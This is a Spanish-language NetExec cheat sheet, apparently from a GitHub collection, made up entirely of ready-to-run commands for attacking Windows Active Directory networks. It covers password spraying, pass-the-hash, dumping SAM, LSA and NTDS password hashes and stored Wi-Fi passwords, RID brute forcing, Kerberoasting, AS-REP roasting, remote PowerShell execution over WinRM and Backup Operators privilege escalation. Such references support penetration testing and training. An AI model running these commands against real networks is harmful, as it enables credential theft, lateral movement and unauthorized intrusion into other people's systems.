# NetExec Cheat Sheet

#### Listar equipos dentro de la red de un AD
```
netexec smb 192.168.1.0/24
```

#### SMB con credenciales a dominio WORKGROUP
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -d WORKGROUP
```

#### SMB con credenciales y especificando a un puerto
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --port <PORT>
```

#### Password Spraying
```
netexec smb 192.168.1.0/24 -u '<USERNAME>' -p listpassword.txt | grep +
```

#### Spraying Attack con usuario y contraseña
```
netexec smb <IP-ADDRESS> -u users.txt -p passwd.txt
```

#### Spraying Attack usando HashNTLM
```
netexec smb <IP-ADDRESS> -u users.txt -H '<HASH-NTLM>'
```

#### Conocer en que equipos se puede autenticar especificando un usuario y password
```
netexec smb 192.168.1.0/24 -u '<USERNAME>' -p '<PASSWORD>'
```

#### Spraying Attack con usuario y contraseña lineal
```
netexec smb <IP-ADDRESS> -u users.txt -p passwd.txt --no-bruteforce --continue-on-success
```

#### Enumeración de directorios compartidos SMB con NULL session
```
netexec smb <IP-ADDRESS> -u '' -p ''
netexec smb <IP-ADDRESS> -u 'a' -p ''
```

#### Enumeración de directorios compartidos SMB con NULL session
```
netexec smb <IP-ADDRESS> -u 'null' -p '' --shares
```

#### Enumeración de directorios compartidos SMB y mostrar datos y archivos en un archivo JSON que guarda sobre los archivos compartidos con acceso de lectura
```
netexec smb <IP-ADDRESS> -u 'null' -p '' -M spider_plus
```

#### Descargar un archivo de un directorio compartido
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --share <DIRECTORY-NAME> --get-file <FILE-NAME> <OUTPUT-NAME>
```

#### Descargar todos los archivos que contenga el servidor
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNLOAD_FLAG=True
```

#### Enviar un archivo de un directorio compartido
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE-NAME> \\Windows\\Temp\\<OUTPUT-NAME>
```

#### Enumeración de los usuarios del Directorio Activo
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --users
```

#### Enumeración de los grupos del Directorio Activo
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --groups
```

#### Comprobar a que grupo pertenece nuestro usuario
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M groupmembership -o USER="<USERNAME>"
```

#### Enumeración de los usarios logueados actualmente
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --loggedon-users
```

#### Enumeración de los grupos locales
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --local-group
```

#### PassTheHash
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -H '<HASH>' --local-auth
```

#### Dumping Hashes SAM
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --sam
```

#### Dumping Hashes LSA
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --lsa
```

#### Dumping Hashes NTDS
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --ntds vss
```

#### Obtener la politica de contraseñas del AD
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol
```

#### Dumping WIFI Password
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M wireless
```

#### Obtener las descripciones de los usuarios de LDAP
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
```

#### Enumeración de usuario (Fuerza Bruta) por RID (RID Cycling Attack)
```
netexec smb <IP-ADDRESS> -u 'guest' -p '' --rid-brute
```

#### Ataque de Kerberoasting
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting <OUTPUT-FILE>
```

#### Ataque de Asreproast
```
netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --asreproast <OUTPUT-FILE>
```

#### Ejecutar comando Powershell
```
netexec winrm <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -C '<COMMAND>'
```

#### Elevar Privilegios cuando el usuario pertenece al grupo "Backup Operators"
```
netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)